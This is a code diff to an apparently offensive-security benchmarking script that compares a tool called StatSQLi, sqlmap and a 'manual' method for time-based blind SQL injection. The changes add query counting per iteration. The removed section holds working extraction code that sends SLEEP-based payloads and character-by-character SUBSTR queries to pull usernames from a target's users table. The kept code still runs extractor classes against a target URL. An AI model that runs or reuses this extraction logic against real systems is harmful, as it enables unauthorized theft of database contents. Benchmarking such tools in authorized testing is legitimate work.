@@ -45,6 +45,10 @@ class BenchmarkRunner:
             'sqlmap': [],
             'manual': []
         }
+        self.query_counts: Dict[str, List[int]] = {
+            'statsqli': [],
+            'manual': []
+        }
         self.process_comparison_data: Dict = {}
     
     def benchmark_statsqli(self) -> List[float]:
@@ -75,27 +79,31 @@ class BenchmarkRunner:
                     self.process_comparison_data['statsqli_steps'] = extractor.steps
                     self.process_comparison_data['statsqli_queries'] = extractor.total_queries
                     self.process_comparison_data['statsqli_result'] = result
+                    # Track query count for this iteration
+                    self.query_counts['statsqli'].append(extractor.total_queries)
                 else:
-                    tool = StatSQLi(
-                        self.target_url,
-                        self.test_payload,
-                        delay=2.0,
-                        parallel=True
+                    # Track queries for all iterations, not just first
+                    analyzer = TimingAnalyzer()
+                    extractor = BinarySearchExtractor(
+                        self.target_url, self.test_payload, 2.0, analyzer, track_steps=False
                     )
-                    result = tool.extract_string_custom(
+                    result = extractor.extract_string(
                         table="users",
                         column="username",
                         where_clause=f"id={self.user_id} LIMIT 0,1",
                         max_length=20
                     )
+                    # Track query count for this iteration
+                    self.query_counts['statsqli'].append(extractor.total_queries)
                 
                 elapsed = time.time() - start
                 times.append(elapsed)
-                print(f"  [+] Completed in {elapsed:.2f}s - Extracted: {result}")
+                print(f"  [+] Completed in {elapsed:.2f}s - Extracted: {result} ({extractor.total_queries} queries)")
                 
             except Exception as e:
                 print(f"  [!] Error: {e}")
                 times.append(float('inf'))
+                self.query_counts['statsqli'].append(0)
         
         return times
     
@@ -213,80 +221,32 @@ class BenchmarkRunner:
                     self.process_comparison_data['traditional_steps'] = extractor.steps
                     self.process_comparison_data['traditional_queries'] = extractor.total_queries
                     self.process_comparison_data['traditional_result'] = result
+                    # Track query count for this iteration
+                    self.query_counts['manual'].append(extractor.total_queries)
                 else:
-                    # Traditional method: linear search with simple threshold
-                    session = requests.Session()
-                    
-                    # Extract base URL
-                    if '?' in self.target_url:
-                        url = self.target_url.split('?')[0]
-                    else:
-                        url = self.target_url
-                    
-                    # Establish baseline (simple average, no statistics)
-                    baseline_times = []
-                    baseline_payload = self.test_payload.format(condition="1=0")
-                    for _ in range(5):
-                        req_start = time.time()
-                        try:
-                            session.get(url, params={'id': baseline_payload}, timeout=30)
-                        except requests.RequestException:
-                            pass
-                        baseline_times.append(time.time() - req_start)
-                    baseline_avg = sum(baseline_times) / len(baseline_times)
-                    threshold = baseline_avg + 1.5  # Simple threshold (1.5s above baseline)
-                    
-                    # Extract string using linear search (traditional method)
-                    result = ""
-                    max_length = 20
-                    
-                    for pos in range(1, max_length + 1):
-                        char_found = False
-                        
-                        # Linear search through printable ASCII (32-126)
-                        for ascii_val in range(32, 127):
-                            # Test if character equals this ASCII value
-                            char_query = f"UNICODE(SUBSTR((SELECT username FROM users WHERE id={self.user_id} LIMIT 0,1), {pos}, 1))"
-                            condition = f"{char_query} = {ascii_val}"
-                            
-                            # Build payload
-                            if "SLEEP" in self.test_payload.upper():
-                                payload_template = re.sub(
-                                    r'SLEEP\([0-9.]+\)',
-                                    'SLEEP(2)',
-                                    self.test_payload,
-                                    flags=re.IGNORECASE
-                                )
-                                payload = payload_template.format(condition=condition)
-                            else:
-                                payload = self.test_payload.format(
-                                    condition=f"({condition}) AND SLEEP(2)"
-                                )
-                            
-                            # Make request and measure time
-                            req_start = time.time()
-                            try:
-                                session.get(url, params={'id': payload}, timeout=30)
-                            except requests.RequestException:
-                                pass
-                            elapsed = time.time() - req_start
-                            
-                            # Simple threshold check (traditional method)
-                            if elapsed > threshold:
-                                result += chr(ascii_val)
-                                char_found = True
-                                break
-                        
-                        if not char_found:
-                            break  # End of string
+                    # Track queries for all iterations, not just first
+                    analyzer = TimingAnalyzer()
+                    extractor = TraditionalExtractor(
+                        self.target_url, self.test_payload, 2.0, analyzer
+                    )
+                    result = extractor.extract_string(
+                        table="users",
+                        column="username",
+                        where_clause=f"id={self.user_id} LIMIT 0,1",
+                        max_length=20
+                    )
+                    # Track query count for this iteration
+                    self.query_counts['manual'].append(extractor.total_queries)
                 
                 elapsed = time.time() - start
                 times.append(elapsed)
-                print(f"  [+] Completed in {elapsed:.2f}s - Extracted: {result}")
+                query_count = self.query_counts['manual'][-1] if self.query_counts['manual'] else 0
+                print(f"  [+] Completed in {elapsed:.2f}s - Extracted: {result} ({query_count} queries)")
                 
             except Exception as e:
                 print(f"  [!] Error: {e}")
                 times.append(float('inf'))
+                self.query_counts['manual'].append(0)
         
         return times
     
@@ -365,7 +325,8 @@ class BenchmarkRunner:
             'iterations': self.iterations,
             'user_id': self.user_id,
             'summary': summary,
-            'raw_times': self.results
+            'raw_times': self.results,
+            'query_counts': self.query_counts
         }
         
         with open(filename, 'w') as f:
